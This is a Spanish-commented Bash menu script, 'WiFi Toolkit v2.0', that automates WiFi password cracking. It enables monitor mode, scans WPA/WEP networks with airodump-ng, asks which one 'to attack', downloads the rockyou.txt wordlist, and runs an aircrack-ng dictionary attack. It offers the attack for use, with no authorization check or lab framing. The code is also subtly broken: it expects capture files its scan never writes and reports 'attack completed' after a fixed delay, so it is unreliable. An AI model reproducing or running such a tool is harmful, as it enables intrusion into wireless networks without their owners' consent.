#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
ORANGE='\033[0;33m'
WHITE='\033[1;37m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit_v2"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "hcxpcapngtool")

# Crear directorios del proyecto
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
}

# Verificar e instalar dependencias
install_dependencies() {
    dialog --title "Dependencias Necesarias" --msgbox "Se comprobarán las dependencias necesarias." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --infobox "Instalando $dep..." 8 40
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "No se pudo instalar $dep. Instálelo manualmente." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Detectar hardware compatible con modo monitor
find_monitor_hardware() {
    local interface=$(iw dev | grep Interface | awk '{print $2}')
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró hardware compatible para monitorización." 8 40
        return 1
    fi
    dialog --title "Hardware Compatible" --yesno "Se encontró el dispositivo $interface. ¿Deseas activarlo en modo monitor?" 8 40
    if [[ $? -eq 0 ]]; then
        airmon-ng start "$interface" &>/dev/null || iw dev "$interface" set type monitor &>/dev/null
        dialog --title "Modo Monitor" --msgbox "Modo monitor activado en $interface." 8 40
    fi
}

# Escanear redes WiFi
scan_wifi_networks() {
    local interface=$(iw dev | grep Interface | awk '{print $2}')
    dialog --title "Escaneo de Redes" --infobox "Escaneando redes WiFi..." 8 40
    xterm -hold -e "airodump-ng --write $RESULTS_DIR/wifi_scan --output-format csv $interface" &
    sleep 10
    killall airodump-ng
}

# Listar redes WiFi con colores según señal
list_wifi_networks() {
    local scan_file="$RESULTS_DIR/wifi_scan-01.csv"
    if [[ ! -f "$scan_file" ]]; then
        dialog --title "Error" --msgbox "No se encontraron resultados de escaneo." 8 40
        return 1
    fi

    networks=$(awk -F',' '/WPA|WEP/ {print $1, $4, $9}' "$scan_file" | tail -n +2 | sort -k3 -nr)
    formatted_networks=""
    while IFS= read -r line; do
        local signal=$(echo "$line" | awk '{print $3}')
        if (( signal >= 80 )); then
            formatted_networks+="${GREEN}$line${NC}\n"
        elif (( signal >= 50 )); then
            formatted_networks+="${ORANGE}$line${NC}\n"
        elif (( signal >= 30 )); then
            formatted_networks+="${WHITE}$line${NC}\n"
        else
            formatted_networks+="${RED}$line${NC}\n"
        fi
    done <<< "$networks"

    dialog --title "Redes Detectadas" --msgbox "${formatted_networks}" 20 60
}

# Seleccionar red y atacar
select_and_attack() {
    local scan_file="$RESULTS_DIR/wifi_scan-01.csv"
    local networks=$(awk -F',' '/WPA|WEP/ {print $1, $4, $9}' "$scan_file" | tail -n +2 | sort -k3 -nr | awk '{print $1, $2}' | nl)
    local selected_network=$(dialog --title "Selecciona una Red" --menu "Redes detectadas:" 20 60 10 $networks 3>&1 1>&2 2>&3)

    if [[ -z "$selected_network" ]]; then
        dialog --title "Error" --msgbox "No seleccionaste ninguna red." 8 40
        return
    fi

    local bssid=$(echo "$networks" | awk -v num="$selected_network" 'NR==num {print $2}')
    local pwr=$(echo "$networks" | awk -v num="$selected_network" 'NR==num {print $3}')

    dialog --title "Ataque" --yesno "¿Deseas atacar la red $bssid con señal $pwr?" 8 40
    if [[ $? -eq 0 ]]; then
        perform_attack "$bssid"
    else
        dialog --title "Siguiente Red" --msgbox "Pasando a la siguiente red..." 8 40
        select_and_attack
    fi
}

# Realizar ataque
perform_attack() {
    local bssid=$1
    local dictionary=$(find_or_download_dictionary)
    dialog --title "Ataque en Proceso" --infobox "Iniciando ataque contra $bssid..." 8 40

    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/wifi_scan*.cap" &
    sleep 5
    dialog --title "Ataque Completado" --msgbox "El ataque contra $bssid ha finalizado." 8 40
}

# Buscar o descargar diccionario
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit v2.0" --menu "Selecciona una opción:" 20 60 10 \
            1 "Dependencias necesarias" \
            2 "Buscar hardware compatible con monitorización" \
            3 "Buscar redes WiFi" \
            4 "Listar todas las redes" \
            5 "Recomendar red a vulnerar" \
            6 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) find_monitor_hardware ;;
            3) scan_wifi_networks ;;
            4) list_wifi_networks ;;
            5) select_and_attack ;;
            6) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
        esac
    done
}

# Inicio del script
prepare_project_directory
main_menu
